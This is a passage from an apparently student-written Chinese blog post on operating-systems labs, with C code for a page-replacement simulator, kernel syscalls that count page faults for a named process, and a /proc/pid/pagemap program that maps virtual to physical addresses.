class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            frames[frame_number][i] = main_array[page_number * PAGE_SIZE + i];</span><br><span class="line">        &#125;</span><br><span class="line">        page_faults++;</span><br><span class="line">        frame_queue[frame_number] = page_number;</span><br><span class="line">        frame_timestamp[frame_number] = current_time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32m页面命中\033[0m，页面 %3d 在帧 %2d，偏移 %2d 的数据：&quot;</span>, page_number, page_table[page_number], offset);</span><br><span class="line">        frame_timestamp[page_table[page_number]] = current_time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%5d &quot;</span>, main_array[page_number * PAGE_SIZE + offset]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    initialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提示用户选择页面置换算法</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请选择页面置换算法（1=OPT，2=FIFO，3=LRU），默认随机置换：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;algo_choice);</span><br><span class="line">    <span class="keyword">if</span> (algo_choice &lt; <span class="number">1</span> || algo_choice &gt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无效的页面置换算法选项，使用默认置换方法：随机置换。\n&quot;</span>);</span><br><span class="line">        algo_choice = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当前使用的页面置换算法：%s\n&quot;</span>, algo_name[algo_choice]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提示用户选择页面访问顺序</span></span><br><span class="line">    <span class="type">int</span> access_order = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (algo_choice == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 提示用户选择，错误选择时重新选择</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">4</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;无效的访问顺序选项，请重新选择。\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OPT算法需要知道未来页面访问顺序，请选择页面访问顺序（1=顺序，2=跳跃，3=分支，4=循环）：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;access_order);</span><br><span class="line">        &#125; <span class="keyword">while</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 提示用户选择，错误选择时重新选择</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">5</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;无效的访问顺序选项，请重新选择。\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请选择页面访问顺序（1=顺序，2=跳跃，3=分支，4=循环，5=随机）：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;access_order);</span><br><span class="line">        &#125; <span class="keyword">while</span> (access_order &lt; <span class="number">1</span> || access_order &gt; <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据选择的访问顺序访问页面</span></span><br><span class="line">    <span class="keyword">switch</span> (access_order)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// 顺序访问</span></span><br><span class="line">        <span class="comment">// 构建future_pages数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = i / PAGE_SIZE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            access_page(i / PAGE_SIZE, i % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// 跳跃访问</span></span><br><span class="line">        <span class="comment">// 构建future_pages数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE;</span><br><span class="line">        <span class="comment">// 以JUMP_NUM_FRAMES步长间隔访问</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            access_page(i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE, i * JUMP_NUM_FRAMES % ARRAY_SIZE % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// 分支访问</span></span><br><span class="line">        <span class="comment">// 构建future_pages数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 偶数页面帧顺序访问，奇数页面帧跳跃访问</span></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                future_pages[i] = i / PAGE_SIZE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                future_pages[i] = i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                access_page(i / PAGE_SIZE, i % PAGE_SIZE, i);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                access_page(i * JUMP_NUM_FRAMES % ARRAY_SIZE / PAGE_SIZE, i * JUMP_NUM_FRAMES % ARRAY_SIZE % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// 循环访问</span></span><br><span class="line">        <span class="comment">// 构建future_pages数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">            future_pages[i] = (i % (ARRAY_SIZE / LOOP_TIMES)) / PAGE_SIZE;</span><br><span class="line">        <span class="comment">// 循环访问loop_times次</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++) </span><br><span class="line">            access_page((i % (ARRAY_SIZE / LOOP_TIMES)) / PAGE_SIZE, (i % (ARRAY_SIZE / LOOP_TIMES)) % PAGE_SIZE, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>: <span class="comment">// 随机访问</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> ind = rand() % ARRAY_SIZE;</span><br><span class="line">            access_page(ind / PAGE_SIZE, ind % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ARRAY_SIZE; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> ind = rand() % ARRAY_SIZE;</span><br><span class="line">            access_page(ind / PAGE_SIZE, ind % PAGE_SIZE, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 打印future_pages */</span></span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; NUM_PAGES; i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;%d &quot;, future_pages[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出页面错误计数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;页面访问错误计数：%d，命中率：%.2f%%\n&quot;</span>, page_faults, (<span class="number">1</span> - (<span class="type">float</span>)page_faults / ARRAY_SIZE) * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序执行结果">程序执行结果</h3><p>这是原始输出示例，但为了更好地演示，我对程序做了一些修改并注释掉了一些输出。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-output.png"alt="原始输出" /><figcaption aria-hidden="true">原始输出</figcaption></figure><h4 id="opt">OPT</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-opt.png"alt="OPT执行结果" /><figcaption aria-hidden="true">OPT执行结果</figcaption></figure><h4 id="fifo">FIFO</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-fifo.png"alt="FIFO执行结果" /><figcaption aria-hidden="true">FIFO执行结果</figcaption></figure><h4 id="lru">LRU</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-2-lru.png"alt="LRU执行结果" /><figcaption aria-hidden="true">LRU执行结果</figcaption></figure><p>由于OPT算法需要知道未来页面访问顺序，选择OPT算法后没有选项5=随机访问。</p><h2id="任务3修改linux内核页面错误处理函数以打印调试信息">任务3：修改Linux内核页面错误处理函数以打印调试信息</h2><h3 id="任务要求-2">任务要求</h3><ol type="1"><li><p>编写两个类似于helloworld或简单for循环的应用程序作为测试目标。</p></li><li><p>在Linux内核的页面错误处理函数do_no_page()或类似函数中使用printk添加调试信息（函数名称在不同版本中可能不同），打印特定进程的页面错误信息（使用程序名称作为过滤条件），并计数页面错误。</p></li><li><p>还可以在Linux内核的物理页面帧分配函数get_free_page()或类似函数中使用printk添加调试信息（函数名称在不同版本中可能不同），打印特定进程执行期间新页面帧分配的信息（使用程序名称作为过滤条件），并计数相关信息。</p></li></ol><h3 id="修改内核源代码">修改内核源代码</h3><h4 id="添加代码-.mmmemory.c">添加代码 <code>./mm/memory.c</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加两个系统调用用于程序控制，一个用于设置目标程序名称，一个用于获取目标程序的页面错误计数</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> target_program[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 目标程序名称</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_fault_count = <span class="number">0</span>;      <span class="comment">// 页面错误计数</span></span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(set_target_program_name, <span class="type">const</span> <span class="type">char</span> __user *, program_name) &#123;</span><br><span class="line">        <span class="comment">// 将名称复制到内核 </span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(target_program,program_name, <span class="number">255</span>) != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;  <span class="comment">// 如果失败，返回-EFAULT</span></span><br><span class="line"></span><br><span class="line">        target_program[<span class="number">255</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE0(get_page_fault_count) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;%s 页面错误计数：%ld\n&quot;</span>, target_program, page_fault_count);</span><br><span class="line">        page_fault_count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> page_fault_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在do_no_page函数中添加调试信息</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(current-&gt;comm, target_program) == <span class="number">0</span>)</span><br><span class="line">                page_fault_count++;</span><br></pre></td></tr></table></figure><h4 id="系统调用函数声明-.includelinuxsyscalls.h">系统调用函数声明<code>./include/linux/syscalls.h</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加两个系统调用的声明</span></span><br><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_set_target_program_name</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *name)</span>;</span><br><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_get_page_fault_count</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><h4 id="系统调用id-.archx86entrysyscallssyscall_64.tbl">系统调用ID<code>./arch/x86/entry/syscalls/syscall_64.tbl</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加两个系统调用的系统调用号</span></span><br><span class="line"><span class="number">448</span>   <span class="number">64</span>   set_target_program_name     sys_set_target_program_name</span><br><span class="line"><span class="number">449</span>   <span class="number">64</span>   get_page_fault_count        sys_get_page_fault_count</span><br></pre></td></tr></table></figure><h4 id="系统调用id声明-.includeuapiasm-genericunistd.h">系统调用ID声明<code>./include/uapi/asm-generic/unistd.h</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加两个系统调用的声明</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_target_program_name 448</span></span><br><span class="line">__SYSCALL(__NR_set_target_program_name, sys_set_target_program_name)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_page_fault_count 449</span></span><br><span class="line">__SYSCALL(__NR_get_page_fault_count, sys_get_page_fault_count)</span><br></pre></td></tr></table></figure><h3 id="内核编译后的测试代码">内核编译后的测试代码</h3><p>编译时会报错如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-3-error1.png"alt="错误" /><figcaption aria-hidden="true">错误</figcaption></figure><p>起初我不知道这个错误是什么意思，经过长时间的修改无效后，我后来添加了<code>#include &lt;linux/syscalls.h&gt;</code>，它就能工作了。这意味着如果你定义系统调用，必须包含这个头文件。但错误信息不是很清晰，导致我浪费了很多时间。</p><p>下面是test1.c，test2.c只是去掉了新添加的系统调用。这是为了测试调试信息是否可控。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设这些是你新系统调用的编号</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_SET_TARGET_PROGRAM_NAME 448</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_GET_PAGE_FAULT_COUNT 449</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> size = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 设置目标程序名称</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *target_program = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    syscall(SYS_SET_TARGET_PROGRAM_NAME, target_program);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行可能触发页面错误的操作</span></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">            <span class="built_in">array</span>[i][j] = i + j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取并输出页面错误计数</span></span><br><span class="line">    syscall(SYS_GET_PAGE_FAULT_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序执行结果-1">程序执行结果</h3><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-3-test_result.png"alt="程序执行结果" /><figcaption aria-hidden="true">程序执行结果</figcaption></figure><p>如图所示，仅打印了test1程序的页面错误计数，而未打印test2程序的页面错误计数。</p><h2id="任务4使用linux中的procpidpagemap计算va到pa的映射">任务4：使用Linux中的/proc/pid/pagemap计算VA到PA的映射</h2><h3 id="任务要求-3">任务要求</h3><ol type="1"><li><p>Linux的/proc/pid/pagemap文件允许用户查看当前进程虚拟页面的物理地址和其他相关信息。每个虚拟页面包含一个64位值，注意分析64位信息。</p></li><li><p>获取当前进程的pagemap文件的完整名称</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 来自ppt的示例代码</span></span><br><span class="line"><span class="type">pid_t</span> pid = getpid();</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d&quot;</span>, pid);</span><br><span class="line"><span class="built_in">strcpy</span>(filename, <span class="string">&quot;/proc/&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(filename, buf);</span><br><span class="line"><span class="built_in">strcat</span>(filename, <span class="string">&quot;/pagemap&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以一步完成</span></span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br></pre></td></tr></table></figure></li><li><p>可以输出进程中一个或多个全局变量或自定义函数的虚拟地址、页面编号、物理页面帧编号、物理地址等信息。</p></li></ol><p>思考：</p><ol type="1"><li><p>如何扩展实验（编写通用函数）以显示指定进程的指定虚拟地址对应的物理地址。</p></li><li><p>如何扩展实验以验证不同进程的共享库（例如一些已知的、常用的*.so库）具有相同的物理地址。</p></li></ol><h3 id="代码实现-2">代码实现</h3><p>program.c实现输出一个或多个全局变量或自定义函数的虚拟地址、页面编号、物理页面帧编号、物理地址等信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPhysicalAddress</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *description, <span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pageSize = getpagesize();                            <span class="comment">// 获取系统设置的页面大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_pageIndex = vaddr / pageSize;            <span class="comment">// 计算相对于0x0的此虚拟地址经过的页面数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_offset = v_pageIndex * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>); <span class="comment">// 计算在/proc/pid/page_map文件中的偏移</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> page_offset = vaddr % pageSize;            <span class="comment">// 计算虚拟地址在页面内的偏移</span></span><br><span class="line">    <span class="type">uint64_t</span> item = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(buf, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;打开pagemap时出错&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, v_offset, SEEK_SET); <span class="comment">// 将文件指针移动到文件中对应的位置以获取item</span></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;item, <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)) != <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;读取pagemap时出错&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> phy_pageIndex = (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>) &amp; item;      <span class="comment">// 物理页面编号，即取item的0-54位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> paddr = (phy_pageIndex * pageSize) + page_offset; <span class="comment">// 物理地址 = 物理页面编号 * 页面大小 + 页面偏移</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;【%s】pid = %d, 虚拟地址 = 0x%lx, 页面编号 = %lu, 物理地址 = 0x%lx, 物理页面帧编号 = %lu\n&quot;</span>,</span><br><span class="line">           description, getpid(), vaddr, v_pageIndex, paddr, phy_pageIndex);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>; <span class="comment">// 全局常量</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">100</span>;                   <span class="comment">// 局部变量</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">100</span>;            <span class="comment">// 局部静态变量</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> d = <span class="number">100</span>;             <span class="comment">// 局部常量</span></span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>); <span class="comment">// 动态内存</span></span><br><span class="line"></span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;全局常量&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;a);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;局部变量&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;b);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;局部静态变量&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;c);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;局部常量&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;d);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;动态内存&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)p);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>va2pa.c实现输出指定进程的指定虚拟地址对应的物理地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 